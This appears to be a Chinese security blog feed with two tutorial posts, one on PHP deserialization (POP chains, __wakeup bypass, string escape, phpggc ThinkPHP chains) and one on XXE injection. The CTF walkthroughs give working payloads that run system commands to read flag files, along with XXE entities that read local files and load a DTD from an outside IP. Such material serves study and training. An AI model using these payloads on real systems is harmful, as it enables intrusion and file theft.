第二个属性对应的值，是一个字符串string且长度为3。</p><p>用的时候再将其反序列化。</p><p><img src="/../images/Pasted%20image%2020241115181251.png"></p><p>什么时候需要用到序列化和反序列化？</p><ul><li>对象在进行网络传输（比如远程方法调用 RPC 的时候）之前需要先被序列化，接收到序列化的对象之后需要再进行反序列化；</li><li>将对象存储到文件中的时候需要进行序列化，将对象从文件中读取出来需要进行反序列化；</li><li>将对象存储到缓存数据库（如 Redis）时需要用到序列化，将对象从缓存数据库中读取出来需要反序列化。</li></ul><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__construct</span> ():  当对象 new 的时候会自动调用，类似构造函数。<br><br><span class="hljs-variable">__destruct</span> ()：当对象被销毁时会被自动调用，包含主动销毁 (即手动销毁对象) 和被动销毁 (即程序运行结束)，类似析构函数。<br><br><span class="hljs-variable">__sleep</span> ():  执行serialize () 时被自动调用。<br><br><span class="hljs-variable">__wakeup</span> ():  执行unserialize () 时会被自动调用。<br><br><span class="hljs-variable">__invoke</span> ():  当尝试以调用函数的方法调用一个对象时会被自动调用。<br><br><span class="hljs-variable">__toString</span> (): 把类当作字符串使用时触发。<span class="hljs-comment">//echo $a</span><br><br><span class="hljs-variable">__call</span> ():  调用某个方法，若方法存在，则调用；若不存在，则会去调用<span class="hljs-variable">__call</span> 函数。<br><br><span class="hljs-variable">__get</span> ():  读取对象属性时，若存在，则返回属性值；若不存在，则会调用<span class="hljs-variable">__get</span> 函数。<br><br><span class="hljs-variable">__set</span> ():  设置对象的属性时，若属性存在，则赋值；若不存在，则调用<span class="hljs-variable">__set</span> 函数。<br><br><span class="hljs-variable">__isset</span> ():  在不可访问的属性上调用 isset () 或 empty () 触发。<br><br><span class="hljs-variable">__unset</span> ():  在不可访问的属性上使用 unset () 时触发。<br></code></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>序列化和反序列化本身没有问题，但是如果反序列化内容用户可控，且后台不正当地使用了魔术方法，就会导致安全问题。</p><p>当传给<code>unserialize()</code>的<strong>参数可控</strong>时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><p>实战中反序列化漏洞一般是工具扫出来的，或者是一些框架&#x2F;组件已经被爆出来存在反序列化漏洞，攻击者发现目标网站使用了该框架或组件。</p><h1 id="POP-链构造"><a href="#POP-链构造" class="headerlink" title="POP 链构造"></a>POP 链构造</h1><p>一般来说，出现 PHP 反序列化漏洞是因为代码中写的魔术方法不安全。因为魔术方法会被自动调用，那我们就可以构造恶意的exp来触发它，但有的时候如果出现漏洞的代码不在魔术方法中，而是只在一个普通方法中，那我们怎么利用呢？这时候就可以通过构造 POP 链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><p>POP链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的POP链就显而易见了。CTF赛中一般尾部就是get flag的方法，头部则是GET&#x2F;POST传参。</p><p><img src="/../images/Pasted%20image%2020241210183851.png"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>index.php：<br><img src="/../images/Pasted%20image%2020241115185130.png"><br>class.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析代码。由于unserialize()结束时会自动调用__destruct()，所以只要满足 username&#x3D;admin 且 password &#x3D;100，即可得到flag。所以要构造一个 username 属性是 admin 且 password 属性是100的 Name 对象。</p><p>注意 username 和 password 都是 private 属性，这意味着它们只能在 Name 类的内部访问，外部代码无法直接修改这些属性。因此，尝试通过 $person-&gt;username 和 $person-&gt;password 访问会导致 PHP Fatal error。</p><p>编写序列化代码时，只需要将原 class 对象复制粘贴下来，要修改的留下，不修改的删掉，如下：</p><p><img src="/../images/Pasted%20image%2020241115191057.png"></p><p>私有属性名称的前面需加上<code>\0</code>。在URL编码中，<code>\0</code>表示为 <code>%00</code>。</p><p>代码中__wakeup()会将username赋值为guest，所以要想办法绕过该函数。</p><blockquote><p>[!NOTE] CVE-2016-7124（__wakeup 绕过）</p><ul><li>影响版本：PHP 5&lt;5.6.25; PHP 7&lt;7.0.10</li><li>漏洞危害：如存在__wakeup 方法，调用 unserilize () 方法前则先调用__wakeup 方法 (即在反序列化恢复对象之前调用该方法)，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup 执行。</li></ul></blockquote><p>当成员属性数目大于实际数目(O:4)时可以绕过__wakeup()。</p><p>则payload（需要进行url编码）：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00username</span>&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00password</span>&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="CTFSHOW-Web257"><a href="#CTFSHOW-Web257" class="headerlink" title="CTFSHOW-Web257"></a>CTFSHOW-Web257</h2><p><img src="/../images/Pasted%20image%2020241210192918.png"></p><p>构造 backDoor 类对象作为 ctfshowUser 的成员变量，当代码逻辑执行完后，销毁 ctfShowUser 后就会调用到 backDoor.getInfo()方法。</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">// POP链CODE：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="language-php">    </span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser)); <span class="hljs-comment">//cookie要进行url编码</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>序列化后的数据：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;backDoor&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;system(&quot;</span>tac flag.php<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><p><a href="https://www.suyou.world/index.php/2023/12/13/%e7%ac%ac61%e5%a4%a9%ef%bc%9aweb%e6%94%bb%e9%98%b2-php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%8e%9f%e7%94%9f%e7%b1%bbtips%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8cve%e7%bb%95%e8%bf%87%e6%bc%8f/">第61天：WEB攻防-PHP反序列化&amp;原生类TIPS&amp;字符串逃逸&amp;CVE绕过漏洞&amp;属性类型特征 – The-Starry-Sky</a></p><p>如果代码中有过滤操作，如将 admin 替换为 hacker：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>第二个序列化数据在反序列化时 s:5:”hakcer” 只识别前五个字符，而后导致后续反序列化格式出现问题，从而反序列化失败。</p><p>字符串逃逸的意思是让目标被替换后，长度格式仍然正确，使其可以正常被反序列化。在反序列化时，若识别到了正确的序列化数据后，多余的垃圾数据是不影响反序列化结果的。</p><p><img src="/../images/Pasted%20image%2020241210210406.png"></p><p>所以最终在参数 x 处传入数据如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">282</span>:<span class="hljs-string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>同理，如果替换后字符变少了，考虑使反序列化时多识别一些原本属于正常序列化数据的字符。宗旨就是使替换前后的长度相同。</p><h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><p><a href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台</a></p><h1 id="框架漏洞利用"><a href="#框架漏洞利用" class="headerlink" title="框架漏洞利用"></a>框架漏洞利用</h1><p>反序列化链项目：<a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></p><p>它包含对 YSoSerial（Java）、YSoSerial.Net、PHPGGC 和其他工具的支持。使用 Web 界面，可以为各种框架生成反序列化payload。</p><p>包含如下：</p><ul><li>Java – YSoSerial</li><li>NET – YSoSerial.NET</li><li>PHP – PHPGGC</li><li>Python - 原生</li></ul><p>这里主要介绍 <strong>PHPGGC</strong>： <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p>目前该工具支持的框架包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii 和 ZendFramework 等。</p><h2 id="BUUCTF-安洵杯-2019-iamthinking"><a href="#BUUCTF-安洵杯-2019-iamthinking" class="headerlink" title="BUUCTF [安洵杯 2019] iamthinking"></a>BUUCTF [安洵杯 2019] iamthinking</h2><p><img src="/../images/Pasted%20image%2020241211133638.png"></p><p>dirsearch目录扫描，发现<a href="http://www.zip,下载源码审计.发现网站是用/">www.zip，下载源码审计。发现网站是用</a> ThinkPHP 6.0 开发的。</p><p><img src="/../images/Pasted%20image%2020241211120745.png"></p><p>在 app&#x2F;controller&#x2F;index.php 中发现unserialize关键词。</p><p><img src="/../images/Pasted%20image%2020241211121050.png"></p><p>parse_url 解析当前请求的 URL 并提取其组成部分。将 URL 中的 query 字符串（URL结构见下图） 解析成数组 <code>$query</code>。遍历查询字符串中的参数值，检查值是否以字母 <code>O</code> 开头（忽略大小写）。</p><p><img src="/../images/Pasted%20image%2020241113192136.png"></p><p>O是php对象序列化后的第一个字符，parse_url 解析出来的 url 中 的payload 却不能以O开头，那么如何绕过？</p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url小结 - tr1ple - 博客园</a></p><blockquote><p>[!NOTE] 解析url</p><ul><li>URL形如<a href="http://xxx.com///index.php?payload=cmd">http://xxx.com///index.php?payload=cmd</a> （path部分为&#x2F;&#x2F;&#x2F;）时，可以正常访问，但parse_url会返回false。</li><li>parse_url：匹配最后一个@后面符合格式的host。</li><li>curl：匹配第一个@后面符合格式的host。</li></ul></blockquote><p>接下来构造 ThinkPHP 6.0 反序列化漏洞的payload。</p><p>使用 phpggc 工具直接搜索 thinkphp，查看是否有符合版本的链可以利用：</p><p><img src="/../images/Pasted%20image%2020241211133041.png"></p><p>选择要使用的链，查看使用语法格式，这里使用 ThinkPHP&#x2F;RCE3，生成要执行的命令：</p><p><img src="/../images/Pasted%20image%2020241211133400.png"></p><p>因此，payload为</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2508200</span>c-<span class="hljs-number">2</span>a42-<span class="hljs-number">4</span>a62-adb5-e8c33baf78d7.node5.buuoj.cn:<span class="hljs-number">81</span>///public/?payload=O%<span class="hljs-number">3</span>A41%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CCached%<span class="hljs-number">5</span>CStorage%<span class="hljs-number">5</span>CPsr6Cache%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A47%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CCached%<span class="hljs-number">5</span>CStorage%<span class="hljs-number">5</span>CPsr6Cache%<span class="hljs-number">00</span>pool%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A26%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CDirectory%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>filesystem%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A26%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>League%<span class="hljs-number">5</span>CFlysystem%<span class="hljs-number">5</span>CDirectory%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>filesystem%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>CValidate%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>type%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>autosave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>key%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>anything%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211134215.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;类和对象&quot;&gt;&lt;a href=&quot;#类和对象&quot; class=&quot;headerlink&quot; title=&quot;类和对象&quot;&gt;&lt;/a&gt;类和对象&lt;/h1&gt;&lt;p&gt;在面向对象的程序设计中，&lt;strong&gt;类&lt;/strong&gt;和&lt;strong&gt;对象&lt;/strong&gt;是两个非常重要的概念。类</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T06:56:21.000Z</published>
    <updated>2024-12-10T10:21:46.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>XXE (XML External Entity Injection)，即 XML 外部实体注入漏洞。XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取 ( php 原生态代码)、命令执行（如Java中一些第三方库导致）、内网扫描、攻击内网等危害。</p><p>XML 文档的作用是传输和存储数据，其焦点是数据的内容，把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。等同于 JSON 传输。</p><p>XML文档结构：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--DTD，这部分可选的--&gt;</span>          <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span>                                                                          <br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件（.dtd）中(外部引用)。</p><p>DTD实体有以下几种声明方式：</p><ul><li>内部实体：</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;admin&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;a<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br><span class="hljs-comment">&lt;!-- admin --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体：</li></ul><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [</span><br><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="hljs-string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl">    <span class="hljs-variable">%b</span>;</span><span class="language-xml"></span><br><span class="language-xml">]&gt;</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;b1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- awsl --&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] </p><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul></blockquote><ul><li>外部实体：</li></ul><p>外部引用可支持http，file等协议。</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [ <br><span class="hljs-meta">&lt;!ENTITY c <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span> <br>]&gt; <br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;c<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部参数实体：</li></ul><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [</span><br><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.106.143.26/xml.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl">    <span class="hljs-variable">%d</span>;</span><span class="language-xml"></span><br><span class="language-xml">]&gt;</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;d1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">d1</span> <span 